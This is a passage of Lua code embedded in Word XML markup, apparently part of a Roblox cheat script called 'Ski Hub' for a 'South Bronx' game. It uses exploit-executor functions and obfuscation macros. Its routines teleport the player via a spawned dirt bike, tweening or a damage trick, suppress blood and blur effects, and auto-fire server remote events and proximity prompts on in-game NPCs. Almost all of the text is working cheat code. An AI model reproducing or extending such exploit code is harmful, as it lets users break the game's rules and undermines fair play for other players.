        <w:t xml:space="preserve">            getgenv().Find_Bike = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Workspace:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value:FindFirstChild("Owner") and string.match(tostring(Value), LocalPlayer.Name.."'s Car") and Value:FindFirstChild("Body") and Value:FindFirstChild("Body"):FindFirstChild("Passenger") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return Value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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local FindSeatInPlayersCar = LPH_NO_VIRTUALIZE(function(Car)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for _Index, _Value in Car.Body:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if _Value:IsA("Seat") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if _Value.Occupant ~= nil then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            continue</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            else</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return _Value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return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            getgenv().SitInPlayersVehicle = LPH_NO_VIRTUALIZE(function(Player)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if not Player.Character or Player.Character.Humanoid.SeatPart == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local SeatPart = Player.Character.Humanoid.SeatPart</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local Parent = SeatPart.Parent</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                while Parent do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if string.match(tostring(Parent), "'s Car") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Seat = FindSeatInPlayersCar(Parent)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        LocalPlayer.Character.HumanoidRootPart.CFrame = Seat.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Seat:Sit(LocalPlayer.Character.Humanoid)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        break</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Parent = Parent.Parent</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Parent == game then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        break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    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return Seat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Teleport_Status;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local GetDistance = LPH_NO_VIRTUALIZE(function(position1, position2)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return (position1 - position2).Magnitude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local GetTweenSpeed = LPH_NO_VIRTUALIZE(function(distance)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local baseTime = 4.5</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local timeToTween = baseTime * (distance / 50)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return timeToTween</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            HideUI = LPH_NO_VIRTUALIZE(function(Title, Timing)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                getgenv().HideScreenGUI = Instance.new("ScreenGui")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                getgenv().HideScreenGUI.Name = getexecutorname()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                getgenv().HideScreenGUI.Parent = gethui and gethui() or Services.CoreGui</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local frame = Instance.new("Frame")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.Name = "BlackFrame"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.Size = UDim2.new(2, 0, 2, 0) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.Position = UDim2.new(0, -155, 0, -155) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.BackgroundTransparency = 0</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                frame.Parent = getgenv().HideScreenGUI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                local textLabel = Instance.new("TextLabel")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Name = "\nhideuiaethra"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Size = UDim2.new(0, 400, 0, 100)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Font = Enum.Font.SourceSansBold</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.RichText = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Text = '&lt;font color="rgb(255,255,255)"&gt;Ski Hub&lt;/font&gt;\n' .. Title</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.BackgroundTransparency = 1</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextSize = 36</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextStrokeTransparency = 0.8 </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextXAlignment = Enum.TextXAlignment.Center</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextYAlignment = Enum.TextYAlignment.Center</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.TextWrapped = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.AnchorPoint = Vector2.new(0.5, 0.5)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Position = UDim2.new(0.5, 0, 0.5, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                textLabel.Parent = getgenv().HideScreenGUI</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Timing then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local startTime = tick()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local endTime = startTime + Timing</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        while tick() &lt; endTime do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            local timeLeft = endTime - tick()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            textLabel.Text = string.format(</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                '&lt;font color="rgb(255,255,255)"&gt;Ski Hub.&lt;/font&gt;\n%s\nplease wait : &lt;font color="rgb(255,255,255)"&gt;%.2f&lt;/font&gt; seconds',</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                Title, math.max(timeLeft, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            )</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end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</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return textLabel</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)            </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            DeleteSecretUI = LPH_NO_VIRTUALIZE(function(Title)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if getgenv().HideScreenGUI then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    getgenv().HideScreenGUI:Destroy()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    getgenv().HideScreenGUI = nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for i,v in gethui():GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if v.Name == getexecutorname() then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            v:Destroy()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end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local tp_debounce = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local GetCuttingBoard, GetBowl, GetPot, CheckHobo, GetHouse = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Workspace.Map.Locations["The Laboratory"]["Cutting Boards"]:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Prompt = Value:FindFirstChildWhichIsA("ProximityPrompt", true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Prompt and Prompt.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return Value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end), LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Workspace.Map.Locations["The Laboratory"].Bowls:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Prompt = Value:FindFirstChildWhichIsA("ProximityPrompt", true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Prompt and Prompt.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return Value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end), LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Workspace.Map.Locations["The Laboratory"].Extra:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value.Name == "Table" then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Value.CanCollide = false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for Index, Value in Workspace.Map.Locations["The Laboratory"].Pots:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Prompt = Value:FindFirstChildWhichIsA("ProximityPrompt", true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Prompt and Prompt.Enabled then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return Value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end), LPH_NO_VIRTUALIZE(function(Name)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Workspace.Folders.HomelessPeople:FindFirstChild(Name) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Prompt = Workspace.Folders.HomelessPeople:FindFirstChild(Name):FindFirstChildWhichIsA("ProximityPrompt", true)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Prompt and Prompt.Enabled and Workspace.Folders.HomelessPeople:FindFirstChild(Name).LeftLowerLeg.Rotation.X == 90 then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return true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return false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end), LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for Index, Value in Workspace.Map.APTS:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Value:FindFirstChild("Board") then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Name = Value:FindFirstChild("Board").name.SurfaceGui.TextLabel.Text</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Name == LocalPlayer.Name then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return Workspace.Map.Houses:FindFirstChild(Value.Name)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return nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            local Get_Hobo = LPH_NO_VIRTUALIZE(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                for i,v in Workspace.Folders.HomelessPeople:GetChildren() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if CheckHobo(v.Name) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        return v</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                end </w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                return nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">            getgenv().Teleport = LPH_NO_VIRTUALIZE(function(CFrame)   </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                if Config.South_Bronx.TeleportMethod == 'Dirt Bike' then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Bike = Find_Bike()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Bike == nil then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Dealershipinteraction"):FireServer("Spawn", "DirtBike")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local BikeForce = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(3) ; BikeForce = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() until Find_Bike() ~= nil or BikeForce == true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Bike = Find_Bike()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Bike == nil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`Your bike was not found!`,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/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return "Failed"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if Bike and Bike.DriveSeat and Bike.DriveSeat.Occupant ~= nil and Bike.DriveSeat.Occupant ~= LocalPlayer.Character.Humanoid then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        ReplicatedStorage:WaitForChild("RemoteEvents"):WaitForChild("Dealershipinteraction"):FireServer("Spawn", "DirtBike")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local BikeForce = false</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.spawn(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait(3) ; BikeForce = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat task.wait() until Find_Bike() ~= nil or BikeForce == true</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Bike = Find_Bike()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if Bike == nil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`Your bike was not found!`,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/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            return "Failed"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    LocalPlayer.Character.HumanoidRootPart.CFrame = Bike.PrimaryPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Bike.DriveSeat:Sit(LocalPlayer.Character.Humanoid)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(1.5)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index = 1, 50 do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Bike:SetPrimaryPartCFrame(CFrame + Vector3.new(0, 1.5, 0))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(1)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index = 1, 10 do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        Bike:SetPrimaryPartCFrame(CFrame + Vector3.new(0, 1.5, 0))</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    for Index, Value in Bike:GetDescendants() do</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Value.Velocity = Vector3.new(0, 0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            Value.RotVelocity = Vector3.new(0, 0, 0)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    task.wait(.25)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    ReplicatedStorage.RemoteEvents.ClientEffects:FireServer("JumpRequest")</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return "Success"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif Config.South_Bronx.TeleportMethod == 'Tween' then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local DistanceFromPos = GetDistance(LocalPlayer.Character.HumanoidRootPart.Position , CFrame.Position)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    local Tween = Services.TweenService:Create(LocalPlayer.Character.HumanoidRootPart, TweenInfo.new(GetTweenSpeed(DistanceFromPos), Enum.EasingStyle.Linear), {CFrame = CFrame})</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    Tween:Play() ; Tween.Completed:Wait() ;</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    return (LocalPlayer.Character.HumanoidRootPart.Position - CFrame.Position).Magnitude &gt; 20 and "Success" or "Failed"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                elseif Config.South_Bronx.TeleportMethod == 'Damage' then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    if tp_debounce then repeat wait(.1) until not tp_debounce end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    tp_debounce = true</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    HideUI("teleporting.\nplease wait.")</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                    pcall(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local E1 = LocalPlayer.PlayerGui.Misc.Blood.ImageLabel.Changed:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.PlayerGui.Misc.Blood.ImageLabel.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local E3 = LocalPlayer.PlayerGui.Misc.Blood.Impact.Changed:Connect(function()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            LocalPlayer.PlayerGui.Misc.Blood.Impact.Visible = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local E5 = Lighting.ChildAdded:Connect(function(a)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if tostring(a) == "KN_Blur" then </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                a.Enabled = false</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            end</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        local Hobo = Get_Hobo()</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        if not Hobo then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            repeat wait(1) Hobo = Get_Hobo()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            until Hobo ~= nil</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        end</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                        repeat</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            task.wait()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                            if Hobo then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                LocalPlayer.Character.HumanoidRootPart.CFrame = Hobo.HumanoidRootPart.CFrame</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                fireproximityprompt(Hobo:FindFirstChildWhichIsA('ProximityPrompt', true))</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                if not CheckHobo(Hobo.Name) then</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                    Hobo = Get_Hobo()</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">                                end</w:t>
      </w:r>
    </w:p>
    <w:p>
